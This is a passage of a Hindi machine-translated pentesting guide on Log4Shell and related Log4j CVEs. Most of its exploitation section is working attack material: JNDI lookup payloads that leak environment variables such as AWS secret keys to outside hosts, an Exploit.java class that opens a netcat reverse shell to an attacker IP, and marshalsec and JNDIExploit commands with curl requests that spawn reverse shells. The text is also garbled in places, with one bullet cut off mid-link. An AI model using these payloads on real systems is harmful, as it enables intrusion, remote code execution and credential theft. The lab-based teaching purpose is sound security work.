рдпрд╣ рдзрд╛рд░рдгрд╛ рдЬрд▓реНрджреА рд╣реА рдзреНрд╡рд╕реНрдд рд╣реЛ рдЧрдИ рдЬрдм **CVE-2021-4104** рдХрд╛ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдпрд╣ Log4j 1.x рдкрд░ рднреА рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ, рдФрд░ Logback рдХреЗ **рдкреНрд░рднрд╛рд╡ рдХреА рд╕рдВрднрд╛рд╡рдирд╛** рдХреЛ [рдореВрд▓реНрдпрд╛рдВрдХрди](https://jira.qos.ch/browse/LOGBACK-1591) рдХрд┐рдпрд╛ рдЧрдпрд╛ред рдЗрд╕ рдХрдо рдЧрдВрднреАрд░ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рдХреЛ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдирдП Logback рд╕рдВрд╕реНрдХрд░рдг, 1.3.0-alpha11 рдФрд░ 1.2.9, рдЕрдм [рдЬрд╛рд░реА](https://search.maven.org/artifact/ch.qos.logback/logback-classic) рдХрд┐рдП рдЧрдП рд╣реИрдВред\\
* **CVE-2021-45105** **\[рдЙрдЪреНрдЪ]**: **Log4j 2.16.0** рдХреЛ рдПрдХ DoS рд╕рдВрдХрдЯ рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдкрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ 'рдЙрдЪреНрдЪ' рдЧрдВрднреАрд░рддрд╛ рд╕реНрддрд░ рдХреЗ рд░реВрдк рдореЗрдВ рд░реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред Apache рдиреЗ рдЗрд╕рдХреЗ рдмрд╛рдж **log4j 2.17.0 рд╕рдВрд╕реНрдХрд░рдг** рдХреЛ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ CVE рдХреЛ рдареАрдХ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╡рд┐рдХрд╛рд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг BleepingComputer рдХреА [рдирд╡реАрдирддрдо рд░рд┐рдкреЛрд░реНрдЯ](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) рдореЗрдВ рджрд┐рдП рдЧрдП рд╣реИрдВред
* [**CVE-2021-44832**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/): рдпрд╣ рдирдпрд╛ CVE log4j рдХреЗ **2.17 рд╕рдВрд╕реНрдХрд░рдг** рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ **рд╣рдорд▓рд╛рд╡рд░ рдХреЛ log4j рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рд░рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП JDBCAppender рдореЗрдВ рдПрдХ JDNI URL рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/) рдХреЛ рдкрдврд╝реЗрдВред

## Log4Shell рд╢реЛрдзрд╛рд░реНрдерддрд╛

### рдЦреЛрдЬ

рдпрд╣ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрддрддрд╛ рдЦреЛрдЬрдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рдкрддреЗ рдкрд░ рдХрдо рд╕реЗ рдХрдо рдПрдХ **DNS рдЕрдиреБрд░реЛрдз** рднреЗрдЬреЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рддрд░рд╣ рдХреЗ рдкреЗрд▓реЛрдб:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` ([canarytokens.com](https://canarytokens.org/generate) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП)
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` ([interactsh](https://github.com/projectdiscovery/interactsh) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП)
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (Burp Suite рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП)
* `${jndi:ldap://2j4ayo.dnslog.cn}` ([dnslog](http://dnslog.cn) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП)
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` ([
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **рд╕рддреНрдпрд╛рдкрди**

рдкрд╣рд▓реЗ рджрд┐рдП рдЧрдП рдХреБрдЫ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЖрдкрдХреЛ рдХреБрдЫ рдЪрд░ рдбреЗрдЯрд╛ рдбрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ рдЬреЛ рдЬрдм рдпрд╣ рдорд╛рдВрдЧрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд▓реЙрдЧ рд╣реЛрдЧрд╛ред\
рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ 2 рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

* рд╕рдВрдХреЗрдд рдХреА **рд╕рддреНрдпрд╛рдкрди** рдХреЗ рд▓рд┐рдП
* рд╕рдВрдХреЗрдд рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:\
рдпрд╛ рдРрд╕рд╛ `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** рдФрд░ рдпрджрд┐ рдПрдХ **DNS рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ env рдЪрд░ рдХрд╛ рдорд╛рди рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХрдордЬреЛрд░реА рд╣реИред

рдЖрдк рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **рдЫрд┐рдкрд╛рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE рдЬрд╛рдирдХрд╛рд░реА

{% hint style="info" %}
**JDK рдХреЗ рд╕рдВрд╕реНрдХрд░рдг 6u141, 7u131, 8u121 рд╕реЗ рдЕрдзрд┐рдХ рд╡рд╛рд▓реЗ рд╣реЛрд╕реНрдЯ** LDAP рдХрдХреНрд╖рд╛ рд▓реЛрдбрд┐рдВрдЧ рд╡реЗрдХреНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛрдВрдЧреЗ **рд▓реЗрдХрд┐рди рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рд╡реЗрдХреНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ**ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рд╣реИ рдХрд┐ `com.sun.jndi.ldap.object.trustURLCodebase` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП JNDI LDAP рдХрд╛ рдЙрдкрдпреЛрдЧ рджреВрд░рд╕реНрде рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдФрд░ рдЪрд░ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЛ рдЕрднреА рднреА рд╕рдВрднрд╡ рд╣реИред\
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рд╢реЛрд╖рдг рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЬрд╛рд╡рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдореМрдЬреВрджрд╛ рдХрд┐рд╕реА рднреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЧреИрдЬреЗрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА (рдЙрджрд╛рд╣рд░рдгрд╛рд░реНрде, ysoserial рдпрд╛ JNDIExploit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред рд▓реЗрдХрд┐рди рдХрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЙрдиреНрд╣реЗрдВ рдПрдХрд╛рдВрддрд░рд┐рдХ рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рд▓реЛрдб рдФрд░ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛ рдЖрд╕рд╛рди рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ)ред

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** (_рдЬреИрд╕реЗ RMI рдФрд░ CORBA рд╡реЗрдХреНрдЯрд░ рдкрд░ рд╕реАрдорд╛рдПрдБ_) **рдкрд┐рдЫрд▓реЗ JNDI Naming Reference рдЦрдВрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** рдпрд╛ [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/) рдкрд░ рдЬрд╛рдПрдВред
{% endhint %}

### RCE - рдХрд╕реНрдЯрдо рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде Marshalsec

_рдпрд╣ рдЯреНрд░рд┐рдХ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **THM рдмреЙрдХреНрд╕** рд╕реЗ рд▓реА рдЧрдИ рд╣реИ:_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)\_\_

рдЗрд╕ рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [**marshalsec**](https://github.com/mbechler/marshalsec) (рдпрд╣рд╛рдВ рд╕реЗ [**рдЬрд╛рд░ рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**](https://github.com/RandomRobbieBF/marshalsec-jar)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рдПрдХ LDAP referral рд╕рд░реНрд╡рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрдЧрд╛ рдЬреЛ рдХрдиреЗрдХреНрд╢рди рдХреЛ рд╣рдорд╛рд░реЗ рджреНрд╡рд┐рддреАрдп HTTP рд╕рд░реНрд╡рд░ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ рдЬрд╣рд╛рдВ рд╣рдо рд╣рдорд▓рд╛ рдХрд░реЗрдВрдЧреЗ:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
рд╣рдо рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдХреЛрдб рд▓реЛрдб рдХрд░реЗ рдЬреЛ рд╣рдореЗрдВ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рднреЗрдЬреЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ рдЬрд╛рд╡рд╛ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо Exploit.java рд╣реЛрдЧрд╛:

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдХреНрд▓рд╛рд╕ рдлрд╝рд╛рдЗрд▓** рдмрдирд╛рдПрдВ: `javac Exploit.java -source 8 -target 8` рдФрд░ рдлрд┐рд░ рдПрдХ **HTTP рд╕рд░реНрд╡рд░** рдЪрд▓рд╛рдПрдВ рдЬрд┐рд╕реЗ рдЙрд╕реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдмрдирд╛рдИ рдЧрдИ рдХреНрд▓рд╛рд╕ рдлрд╝рд╛рдЗрд▓ рд╣реИ: `python3 -m http.server`ред\
**marshalsec рдХреЗ LDAP рд╕рд░реНрд╡рд░ рдХреЛ рдЗрд╕ HTTP рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдкреЛрдЗрдВрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП**ред\
рдлрд┐рд░, рдЖрдк **рд╡рд┐рдХрд▓реНрдкрдиреАрдп рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреНрд▓рд╛рд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЗрд▓реЛрдб рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЬрд╛рд╡рд╛ рдХреЛ рдПрд▓рдбреАрдПрдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреВрд░рд╕реНрде рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрд╕реНрдЯрдо рдЙрддреНрдкрд╛рджрди рдиреБрдХрд╕рд╛рдирджрд╛рдпрдХ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЖрдкрдХреЛ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдХрдХреНрд╖рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рд╕реЗ рд╡рд┐рдЪрд╛рд░рд╣реАрди рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред_

### RCE - **JNDIExploit**

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдг рд╕реЗ рд▓реЗрдЦрдХ рдиреЗ рд▓реЙрдЧ4рд╢реИрд▓ рдХреА рдЦреЛрдЬ рдХреЗ рдмрд╛рдж рдЗрд╕ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдХреЛ github рд╕реЗ рд╣рдЯрд╛ рджрд┐рдпрд╛ рд╣реИред рдЖрдк рдЗрд╕рдХрд╛ рдХреИрд╢ рдХрд┐рдпрд╛ рд╣реБрдЖ рд╕рдВрд╕реНрдХрд░рдг рдпрд╣рд╛рдВ рдкрд╛рдПрдВрдЧреЗ: [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд▓реЗрдЦрдХ рдХреЗ рдирд┐рд░реНрдгрдп рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕ рдЦреЛрдЬ рдХреЛ рдиреБрдХрд╕рд╛рдирджрд╛рдпрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рд╡реЗрдмрд╡реЗ рдорд╢реАрди рдореЗрдВ рд╕реНрд░реЛрдд рдХреЛрдб рдирд╣реАрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╛ рддреЛ рд╕реНрд░реЛрдд рдХреЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ, рдпрд╛ рдЬрд╛рд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдЬрд╛рдирддреЗ рд╣реБрдП рдХрд┐ рдЖрдк рдЬрд╛рдирддреЗ рдирд╣реАрдВ рд╣реИрдВ рдХрд┐ рдЖрдк рдХреНрдпрд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВред
{% endhint %}

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк рд╕рд┐рд░реНрдл рдЗрд╕ **рд╡рдВрд╢рд╛рд╡рд▓реА рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЛ рд▓реЙрдЧ4рд╢реИрд▓ рдХреЗ рд▓рд┐рдП рдиреБрдХрд╕рд╛рдирджрд╛рдпрдХ** рдкреЛрд░реНрдЯ 8080 рдореЗрдВ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_README рдореЗрдВ рдЖрдкрдХреЛ рдЗрд╕реЗ рдХреИрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓реЗрдЧреА_). рдпрд╣ рдиреБрдХрд╕рд╛рдирджрд╛рдпрдХ рдРрдк рдПрдХ рдиреБрдХрд╕рд╛рдирджрд╛рдпрдХ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд╕рд╛рде рдПрдЪрдЯреАрдЯреАрдкреА рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ _X-Api-Version_ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд▓реЙрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред

рдлрд┐рд░, рдЖрдк **JNDIExploit** рдЬрд╛рд░ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
рдПрдХ рдХреБрдЫ рдорд┐рдирдЯ рдХреЗ рдмрд╛рдж рдХреЛрдб рдкрдврд╝рдиреЗ рдХреЗ рдмрд╛рдж, _com.feihong.ldap.LdapServer_ рдФрд░ _com.feihong.ldap.HTTPServer_ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ **LDAP рдФрд░ HTTP рд╕рд░реНрд╡рд░ рдмрдирд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ**ред LDAP рд╕рд░реНрд╡рд░ рд╕рдордЭреЗрдЧрд╛ рдХрд┐ рдХреМрди рд╕рд╛ рдкреЗрд▓реЛрдб рд╕реЗрд╡рд╛ рдХрд░рдирд╛ рд╣реИ рдФрд░ рдкреАрдбрд╝рд┐рдд рдХреЛ HTTP рд╕рд░реНрд╡рд░ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдЧрд╛, рдЬреЛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реЗрд╡рд╛ рдХрд░реЗрдЧрд╛ред\
_рдХреЙрдо.рдлреЗрд╣реЛрдВрдЧ.рдПрд▓рдбреАрдПрдкреА.рдЧреИрдЬреЗрдЯреНрд╕_ рдореЗрдВ рдЖрдк **рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЧреИрдЬреЗрдЯреНрд╕** рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЗрдЪреНрдЫрд┐рдд рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЕрдирд┐рдпрдорд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ)ред рдФрд░ _рдХреЙрдо.рдлреЗрд╣реЛрдВрдЧ.рдПрд▓рдбреАрдПрдкреА.рдЯреЗрдореНрдкрд▓реЗрдЯ_ рдореЗрдВ рдЖрдк рд╡рд┐рднрд┐рдиреНрди рдЯреЗрдореНрдкрд▓реЗрдЯ рдХрдХреНрд╖рд╛рдПрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВрдЧреА**ред

рдЖрдк **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** рдХреЗ рд╕рд╛рде рд╕рднреА рдЙрдкрд▓рдмреНрдз рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред рдХреБрдЫ рдЙрдкрдпреЛрдЧреА рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рд╣реИрдВ:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
рддреЛ, рд╣рдорд╛рд░реЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдо рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╡рд╣ рдбреЙрдХрд░ рдЕрдкреНрдк рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдЗрд╕реЗ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
рдЖрдк рдЕрдЯреИрдХ рднреЗрдЬрддреЗ рд╕рдордп рдЙрд╕ рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ рдХреБрдЫ рдЖрдЙрдЯрдкреБрдЯ рджреЗрдЦреЗрдВрдЧреЗ рдЬрд╣рд╛рдВ рдЖрдкрдиреЗ **JNDIExploit-1.2-SNAPSHOT.jar** рдХреЛ рдЪрд▓рд╛рдпрд╛ рдерд╛ред

